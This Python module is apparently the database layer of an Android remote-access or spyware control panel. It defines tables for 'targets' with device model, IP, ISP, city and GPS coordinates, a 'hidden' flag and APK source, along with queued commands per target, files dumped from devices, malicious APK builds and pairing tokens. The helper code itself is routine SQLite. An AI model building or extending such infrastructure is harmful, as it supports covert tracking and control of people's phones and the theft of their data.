"""SQLite WAL: target, command, dump, build, sesi, audit, pairing."""
from __future__ import annotations

import sqlite3
import time
from typing import Any, Iterable

from . import config

SCHEMA = """
PRAGMA journal_mode=WAL;
PRAGMA foreign_keys=ON;

CREATE TABLE IF NOT EXISTS targets (
    id           TEXT PRIMARY KEY,
    token        TEXT UNIQUE,
    label        TEXT,
    brand        TEXT,
    model        TEXT,
    android      TEXT,
    sdk          INTEGER DEFAULT 0,
    ip           TEXT,
    isp          TEXT,
    country      TEXT,
    city         TEXT,
    lat          REAL,
    lon          REAL,
    battery      INTEGER DEFAULT 0,
    charging     INTEGER DEFAULT 0,
    storage_free INTEGER DEFAULT 0,
    hidden       INTEGER DEFAULT 0,
    online       INTEGER DEFAULT 0,
    first_seen   REAL NOT NULL,
    last_seen    REAL NOT NULL,
    notes        TEXT DEFAULT '',
    source       TEXT DEFAULT 'apk'
);

CREATE TABLE IF NOT EXISTS commands (
    id        TEXT PRIMARY KEY,
    target_id TEXT NOT NULL,
    type      TEXT NOT NULL,
    args      TEXT DEFAULT '{}',
    status    TEXT DEFAULT 'queued',
    result    TEXT,
    created   REAL NOT NULL,
    updated   REAL NOT NULL,
    FOREIGN KEY (target_id) REFERENCES targets(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS dumps (
    id        TEXT PRIMARY KEY,
    target_id TEXT NOT NULL,
    kind      TEXT NOT NULL,
    filename  TEXT NOT NULL,
    size      INTEGER DEFAULT 0,
    sha256    TEXT,
    created   REAL NOT NULL,
    FOREIGN KEY (target_id) REFERENCES targets(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS builds (
    id      TEXT PRIMARY KEY,
    name    TEXT,
    package TEXT,
    mode    TEXT,
    status  TEXT DEFAULT 'antri',
    log     TEXT DEFAULT '',
    outfile TEXT,
    size    INTEGER DEFAULT 0,
    created REAL NOT NULL,
    updated REAL NOT NULL
);

CREATE TABLE IF NOT EXISTS sessions (
    token   TEXT PRIMARY KEY,
    ip      TEXT,
    ua      TEXT,
    created REAL NOT NULL,
    expires REAL NOT NULL
);

CREATE TABLE IF NOT EXISTS audit (
    id     INTEGER PRIMARY KEY AUTOINCREMENT,
    ts     REAL NOT NULL,
    event  TEXT NOT NULL,
    detail TEXT DEFAULT ''
);

CREATE TABLE IF NOT EXISTS pairs (
    id        TEXT PRIMARY KEY,
    token     TEXT UNIQUE,
    mode      TEXT DEFAULT 'web',
    label     TEXT DEFAULT '',
    target_id TEXT,
    used      INTEGER DEFAULT 0,
    created   REAL NOT NULL,
    expires   REAL NOT NULL,
    ip        TEXT DEFAULT '',
    ua        TEXT DEFAULT ''
);

CREATE INDEX IF NOT EXISTS idx_cmd_target ON commands(target_id, created);
CREATE INDEX IF NOT EXISTS idx_dump_target ON dumps(target_id, created);
CREATE INDEX IF NOT EXISTS idx_pair_token ON pairs(token);
"""

MIGRATIONS = (
    "ALTER TABLE targets ADD COLUMN source TEXT DEFAULT 'apk'",
    "ALTER TABLE targets ADD COLUMN notes TEXT DEFAULT ''",
)


def conn() -> sqlite3.Connection:
    config.ensure_dirs()
    c = sqlite3.connect(config.DB_PATH, timeout=15)
    c.row_factory = sqlite3.Row
    return c


def init() -> None:
    config.ensure_dirs()
    with conn() as c:
        c.executescript(SCHEMA)
    for stmt in MIGRATIONS:
        try:
            with conn() as c:
                c.execute(stmt)
        except sqlite3.OperationalError:
            pass


def q(sql: str, params: Iterable[Any] = ()) -> list[sqlite3.Row]:
    with conn() as c:
        return list(c.execute(sql, tuple(params)).fetchall())


def one(sql: str, params: Iterable[Any] = ()) -> sqlite3.Row | None:
    with conn() as c:
        return c.execute(sql, tuple(params)).fetchone()


def x(sql: str, params: Iterable[Any] = ()) -> None:
    with conn() as c:
        c.execute(sql, tuple(params))
        c.commit()


def audit(event: str, detail: str = "") -> None:
    x("INSERT INTO audit(ts,event,detail) VALUES(?,?,?)", (time.time(), event, detail))


def row2dict(row: sqlite3.Row | None) -> dict[str, Any]:
    return dict(row) if row is not None else {}
